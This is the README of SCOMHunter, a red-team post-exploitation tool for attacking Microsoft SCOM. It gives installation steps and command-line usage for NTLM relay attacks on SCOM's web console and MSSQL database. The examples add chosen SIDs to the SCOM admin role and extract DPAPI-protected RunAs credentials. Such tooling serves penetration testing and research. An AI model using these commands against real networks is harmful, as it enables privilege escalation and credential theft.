[![@unsigned_sh0rt on Twitter](https://img.shields.io/twitter/follow/unsigned_sh0rt?style=social)](https://x.com/unsigned_sh0rt)

# SCOMHunter

SCOMHunter is a post-ex tool for enumerating and attacking System Center Operations Manager (SCOM) infrastructure.

### Please note
This tool was developed and tested in a lab environment. Your mileage may vary on performance. If you run into any problems please don't hesitate to open an issue.

## Installation
I strongly encourage using the [uv](https://docs.astral.sh/uv/getting-started/installation/) package manage for installation

```
curl -LsSf https://astral.sh/uv/install.sh | sh
git clone https://github.com/garrettfoster13/scomhunter
cd comhunter
uv sync
uv run scomhunter.py
```
If you'd rather not use uv, then use a virtualenv
```
git clone https://github.com/garrettfoster13/scomhunter
cd scomhunter
virtualenv --python=python3 .
source bin/activate
pip install -r requirements.txt
```

## Usage
```
SCOMHunter v0.0.1 by @unsigned_sh0rt
                                                                                                                                                                                                                            
Usage: scomhunter [OPTIONS] COMMAND [ARGS]...                                                                                                                                                                              
                                                                                                                                                                                                                            
╭─ Options ─────────────────────────────────────────────────────────────────────────────────╮
│ --help  -h        Show this message and exit.                                             │
╰───────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Commands ────────────────────────────────────────────────────────────────────────────────╮
│ find    Enumerate LDAP for SCOM assets.                                                   │
│ http    SCOM Web Console NTLM Relay Attack                                                │
│ mssql   SCOM MSSQL NTLM Relay Attack - Manipulate SCOM admin role membership              │
│ dpapi   Extract DPAPI Protected RunAs Credentials                                         │
╰───────────────────────────────────────────────────────────────────────────────────────────╯

## MSSQL Relay Attack

The `mssql` command performs an NTLM relay attack against a SCOM MSSQL database server. It sets up a relay server that waits for incoming authentication, relays it to the target MSSQL server, and executes SQL queries to manipulate the SCOM admin role membership.

### Usage Examples

```bash
# Add a user to SCOM admin role (default operation)
scomhunter mssql -t mssql.corp.com -s S-1-5-21-xxx-xxx-xxx-1234

# Remove a user from SCOM admin role
scomhunter mssql -t mssql.corp.com -s S-1-5-21-xxx-xxx-xxx-1234 -d

# List current members of SCOM admin role
scomhunter mssql -t mssql.corp.com -l

# Use custom listening interface and port
scomhunter mssql -t 192.168.1.10:1433 -s S-1-5-21-xxx-xxx-xxx-1234 -i 192.168.1.50 -p 8445
```

### Options

- `-t, --target` - Target MSSQL server (required)
- `-s, --sid` - SID of user to add/remove (required for update/delete operations)
- `-i, --interface` - Interface to listen on (default: 0.0.0.0)
- `-p, --port` - Port to listen on for incoming SMB connections (default: 445)
- `-u, --update` - Add user to SCOM admin role (default operation)
- `-d, --delete` - Remove user from SCOM admin role
- `-l, --list` - List current members of SCOM admin role
- `-v, --verbose` - Enable verbose logging

```
# References

TBD

